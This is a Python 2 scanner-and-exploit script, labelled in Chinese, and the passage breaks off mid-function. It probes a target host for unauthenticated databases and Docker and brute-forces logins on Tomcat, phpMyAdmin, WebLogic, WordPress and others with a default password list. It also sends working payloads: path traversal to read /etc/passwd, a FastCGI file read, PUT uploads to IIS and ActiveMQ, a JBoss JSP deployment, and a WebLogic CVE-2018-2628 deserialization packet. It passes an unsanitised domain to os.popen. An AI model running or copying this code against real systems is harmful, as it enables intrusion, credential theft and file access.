# coding:utf-8
import base64
import httplib
import random
import socket
import sys
import time
import urllib2
import re
import pymongo
import requests
import os
requests.packages.urllib3.disable_warnings()
reload(sys)
sys.setdefaultencoding('utf-8')
timeout = 3
socket.setdefaulttimeout(timeout)

user_list = ['root', 'sa', 'system', 'Administrtor', 'ubuntu']

password_list = ['root', 'sa', 'admin', 'test', 'mysql', '123456', 'admin1234','admin12345', '000000', '987654321', '1234', '12345']

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


def get_ip_vlun(ip):
    vlun_list = []
    try:
        conn = pymongo.MongoClient(str(ip), 27017)
        dbname = conn.database_names()
        if dbname:
            res = 'Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27017'
            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        conn = pymongo.MongoClient(str(ip), 27018)
        dbname = conn.database_names()
        if dbname:
            res = 'Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27018'
            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((str(ip), 6379))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            res = 'Redis数据库未授权访问漏洞 : ' + str(ip) + ':6379'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()
    try:
        s = socket.socket()
        s.connect((ip, int(6379)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "Authentication" in result:
            for pass_ in password_list:
                s = socket.socket()
                s.connect((ip, int(6379)))
                s.send("AUTH %s\r\n" % (pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    res = 'Redis弱口令漏洞 : ' + str(ip) + ':6379|' + str(pass_)
                    vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 2181))
        s.send("envi")
        result = s.recv(1024)
        if "zookeeper.version" in result:
            res = 'ZooKeeper未授权访问漏洞 : ' + str(ip) + ':2181'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        conn = httplib.HTTPConnection(str(ip), 9200, True, timeout=timeout)
        conn.request("GET", '/_cat/master')
        resp = conn.getresponse()
        if resp.status == 200:
            res = 'Elasticsearch未授权访问漏洞 : ' + str(ip) + ':9200'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 11211))
        s.send("stats")
        result = s.recv(1024)
        if "STAT version" in result:
            res = 'Memcache未授权访问漏洞 : ' + str(ip) + ':11211'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:

        r_ = []
        r3 = 'http://' + str(ip) + ':80'
        r4 = 'https://' + str(ip) + ':443'
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                flag_400 = '/otua*~1.*/.aspx'
                flag_404 = '/*~1.*/.aspx'
                request = urllib2.Request(r_r + flag_400)
                req = urllib2.urlopen(request, timeout=timeout)
                if int(req.code) == 400:
                    req_404 = urllib2.urlopen('http://' + r_r + flag_404, timeout=timeout)
                    if int(req_404.code) == 404:
                        res = 'IIS短文件名漏洞 : ' + str(r_r)
                        vlun_list.append(res)
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        try:
            s = socket.socket()
            s.connect((ip, 80))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (ip, 80)
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                url = 'http://' + ip + ":" + str(80) + '/vultest.txt'
                request = urllib2.Request(url)
                res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
                if 'xxscan0' in res_html:
                    res = 'IIS WebDav任意文件上传漏洞 : ' + str(url)
                    vlun_list.append(res)
        except Exception, e:
            pass
        finally:
            s.close()
    except Exception, e:
        pass

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':8080/Manager/login.jsp'
        r4 = 'http://' + str(ip) + ':8080/RetainServer/Manager/login.jsp'
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'login': str(uuser), 'pass': str(ppass), 'Language': 'myLang'}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Router Configuration' in r_br.content:
                                    res = 'Tomcat远程部署弱口令漏洞 : ' + r_r + ':' + uuser + '|' + ppass
                                    vlun_list.append(res)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':8080/manager/html'
        r4 = 'http://' + str(ip) + ':8081/manager/html'
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'Manager App HOW-TO' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                            try:
                                rxrx = requests.get(url=r_r, headers=headers, timeout=timeout)
                                if rxrx.status_code == 200:
                                    res = 'Tomcat远程部署弱口令漏洞 : ' + r_r + ':' + uuser + '|' + ppass
                                    vlun_list.append(res)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass


    try:
        conn = httplib.HTTPConnection(str(ip), 2375, True, timeout=timeout)
        conn.request("GET", '/containers/json')
        resp = conn.getresponse()
        if resp.status == 200 and "HostConfig" in resp.read():
            res = 'Docker未授权访问漏洞 : ' + str(ip) + ':2375/containers/json'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        conn.close()

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent':UA}
        rr = requests.get(url=str('http://' + str(ip) + '/_config'),headers=headers, timeout=timeout)
        if "couch" in rr.content:
            res = 'CouchDB未授权访问漏洞 : ' + str(rr.url)
            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + '/manage '
        r4 = 'http://' + str(ip) + ':8080/manage '
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r, headers=headers,timeout=timeout)
                if 'arbitrary' in rxr.content:
                    res = 'Jenkins未授权访问漏洞 : ' + str(r_r)
                    vlun_list.append(res)
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((ip, 80))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(80) + '/styles/%s.txt' % (filename)
        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
        if 'xxscan0' in res_html:
            res = 'ActiveMQ任意文件上传漏洞 : ' + str(url)
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((ip, int(80)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            res = 'WebServer任意文件读取漏洞 : ' + str(ip) + ':80'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()
    try:
        s = socket.socket()
        s.connect((ip, int(443)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            res = 'WebServer任意文件读取漏洞 : ' + str(ip) + ':443'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((ip, int(8080)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            res = 'WebServer任意文件读取漏洞 : ' + str(ip) + ':8080'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 9000))
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_, 16))
        s.send(data_s)
        try:
            ret = s.recv(1024)
            if ret.find(':root:') > 0:
                res = 'Fast-Cgi文件读取漏洞 : ' + str(ip) + ':9000'
                vlun_list.append(res)
        except Exception, e:
            pass
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':8080/phpmyadmin/index.php'
        r5 = 'http://' + str(ip) + ':999/phpmyadmin/index.php'
        r6 = 'http://' + str(ip) + ':80/phpmyadmin/index.php'
        r_.append(r3)
        r_.append(r5)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'Documentation.html' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'pma_username': str(uuser), 'pma_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'mainFrameset' in r_br.content:
                                    res = 'PHPmyadmin弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    vlun_list.append(res)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((str(ip), 80))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            res = 'HTTP.sys远程代码执行漏洞 : ' + str(ip) + ':80'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 443))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            res = 'HTTP.sys远程代码执行漏洞 : ' + str(ip) + ':80'
            vlun_list.append(res)
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        url = 'http://' + ip + ":" + str(80)
        res_html = urllib2.urlopen(url, timeout=timeout).read()
        if 'WebResource.axd?d=' in res_html:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = urllib2.Request(exp_url)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    res_code = res.code
                except urllib2.HTTPError, e:
                    res_html = e.read()
                    res_code = e.code
                except urllib2.URLError, e:
                    error_i += 1
                    if error_i >= 3: return
                except:
                    return
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            res = '.NET Padding Oracle信息泄露 : ' + str(url)
                            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':80/resin-doc/admin/index.xtp'
        r4 = 'http://' + str(ip) + ':8080/resin-doc/admin/index.xtp'
        r6 = 'http://' + str(ip) + ':8443/resin-doc/admin/index.xtp'
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    res = 'Resin viewfile远程文件读取漏洞 : ' + str(r_r)
                    vlun_list.append(res)
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent':UA}
        rrrx = requests.get(url=str('http://' + str(ip) + ':8080/servlets-examples/'),headers=headers, timeout=5)
        if 'servlet/RequestParamExample' in rrrx.content:
            res = 'Tomcat example 应用信息泄漏漏洞:' + rrrx.url.strip('/')
            vlun_list.append(res)
    except:
        pass
    
    
    
    
    try:
        socket.setdefaulttimeout(timeout)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((ip, int(8080)))
        shell = "langzitest"
        # s1.recv(1024)
        shellcode = ""
        name = random_str(5)
        for v in shell:
            shellcode += hex(ord(v)).replace("0x", "%")
        flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=langzi&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
                   name) + shellcode + \
               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(10)
        url = "http://%s:%d" % (ip, int(8080))
        webshell_url = "%s/%s/langzi.jsp" % (url, name)
        res = urllib2.urlopen(webshell_url, timeout=timeout)
        if 'langzitest' in res.read():
            res = 'Jboss 认证绕过漏洞 : ' + str(webshell_url)
            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':80/jmx-console/'
        r4 = 'http://' + str(ip) + ':8080/jmx-console/'
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    res = 'JBoss后台上传漏洞 : ' + str(r_r)
                    vlun_list.append(res)
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r4 = 'http://' + str(ip) + ':7001/console/login/LoginForm.jsp'
        r8 = 'https://' + str(ip) + ':7002/console/login/LoginForm.jsp'
        r_.append(r4)
        r_.append(r8)
        for r_r in r_:
            try:
                for uuser in user_list:
                    for ppass in password_list:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r, data=data, timeout=timeout)
                        if 'WebLogic Server Console' in rxr.content:
                            res = 'Weblogic弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                            vlun_list.append(res)
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r4 = 'http://' + str(ip) + ':9000/jonasAdmin/ '
        r8 = 'https://' + str(ip) + ':9000/jonasAdmin/ '
        r_.append(r4)
        r_.append(r8)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'JOnAS Administration' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'j_username': str(uuser), 'j_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Deployment' in r_br.content:
                                    res = 'JOnAS弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    vlun_list.append(res)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        sock = socket.socket()
        VER_SIG = ['\\$Proxy[0-9]+']
        try:
            sock.connect((str(ip), 7001))
            sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            time.sleep(1)
        except Exception, e:
            pass
        try:
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077502100000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
                '{:04x}'.format(7001))
            data3 = '1a7727000d3234322e323134'
            data4 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3, data4]:
                sock.send(d.decode('hex'))
        except Exception, e:
            pass
        try:
            payload = '0565080000000100000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += 'ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707737000A556E6963617374526566000E3030302E3030302E3030302E303000001B590000000001EEA90B00000000000000000000000000000078'
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
            sock.send(payload.decode('hex'))
            res = ''
            try:
                for i in xrange(20):
                    res += sock.recv(4096)
                    time.sleep(1)
            except Exception as e:
                pass
        except Exception, e:
            pass
        try:
            p = re.findall(VER_SIG[0], res, re.S)
            if len(p) > 0:
                res = 'Weblogic CVE-2018-2628 : ' + str(ip) + ':7001'
                vlun_list.append(res)
        except Exception, e:
            pass
    except Exception, e:
        pass
    finally:
        sock.close()

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':4848'
        r_.append(r2)
        for xxixx in r_:
            error_i = 0
            flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                         '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                         'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>',
                         'title="Logout from GlassFish']
            for uuser in user_list:
                for ppass in password_list:
                    try:
                        PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                        uuser, ppass)
                        request = urllib2.Request(xxixx + '/j_security_check?loginButton=Login', PostStr)
                        res = urllib2.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib2.HTTPError:
                        return
                    except urllib2.URLError:
                        error_i += 1
                        if error_i >= 3:
                            break
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            res = 'Glassfish弱口令漏洞 : ' + str(xxixx + ':' + str(str(uuser) + '|' + str(ppass)))
                            vlun_list.append(res)
    except Exception, e:
        pass

    try:
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in user_list:
            for ppass in password_list:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (
                    uuser, ppass)
                    request = urllib2.Request('http://' + str(ip) + login_path, PostStr)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    for flag in flag_list:
                        if flag in res_html:
                            res = 'Wordpress弱口令漏洞 : ' + str(request.url + ':' + uuser + '|' + ppass)
                            vlun_list.append(res)
                except Exception, e:
                    pass

    except Exception, e:
        pass

    try:
        url = "http://%s:%d" % (ip, int(8080))
        res = urllib2.urlopen(url + '/axis2/services/listServices', timeout=timeout)
        res_code = res.code
        res_html = res.read()
        if int(res_code) == 404: return
        m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
            res = urllib2.urlopen(read_url, timeout=timeout)
            res_html = res.read()
            if 'axisconfig' in res_html:
                res = 'Axis2任意文件读取漏洞 : ' + str(read_url)
                vlun_list.append(res)
    except Exception, e:
        pass

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':9038/axis2-admin/login'
        r5 = 'http://' + str(ip) + ':8080/axis2-admin/login'
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'action="axis2-admin/login' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'userName': str(uuser), 'password': str(ppass), 'submit': 'Login'}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Upload Service' in r_br.content:
                                    res = 'Axis2弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    vlun_list.append(res)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass
    try:
        r_=[]
        r1 = 'http://'+str(ip)+':8080/l.php'
        r11 = 'http://'+str(ip)+':8080/env.php'
        r111 = 'http://'+str(ip)+':8080/admin_aspcheck.asp'
        r1111 = 'http://'+str(ip)+':8080/env.asp'
        r11111 = 'http://' + str(ip) + ':8080/aspcheck.asp'
        r_.append(r1)
        r_.append(r11)
        r_.append(r111)
        r_.append(r1111)
        r_.append(r11111)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent':UA}
                rxr = requests.get(url=r_r,headers=headers,timeout=10)
                if 'upload_max_filesize' in rxr.content or 'SoftArtisans.FileManager' in rxr.content:
                    res = '服务器探针信息泄露:' + r_r
                    vlun_list.append(res)
                else:
                    pass
            except:
                pass
    except:
        pass

    try:
        domain=url.replace('www.','')
        cmd_res = os.popen('nslookup -type=ns ' + domain).read()    # fetch DNS Server List
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        for server in dns_servers:
            print server
            if len(server) < 5: server += domain

            if os.path.exists('Langzi_Api'):
                dat = os.getcwd() + '\Langzi_Api\BRUTE_VLUN\BIND9.11.3.x64'
            else:
                dat = sys.prefix + '\Lib\site-packages\Langzi_Api\BRUTE_VLUN\BIND9.11.3.x64'
            cmd_res = os.popen(dat + '\dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and cmd_res.find('connection timed out') < 0 and cmd_res.find('XFR size') > 0 :
                res = 'DNS域传送漏洞:' + ip
                vlun_list.append(res)
    except:
        pass

    if vlun_list == []:
        return None
    else:
        return vlun_list


def get_url_vlun(url):
    try:
        vlun_list = []
        r_=[]
        r1_1_1 = url + '/phpinfo.php'
        r1_1_2 = url + '/info.php'
        r1_1_3 = url + '/pi.php'
        r1_1_4 = url + '/php.php'
        r1_1_5 = url + '/i.php'
        r1_1_6 = url + '/mysql.php'
        r1_1_7 = url + '/sql.php'
        r1_1_8 = url + '/test.php'
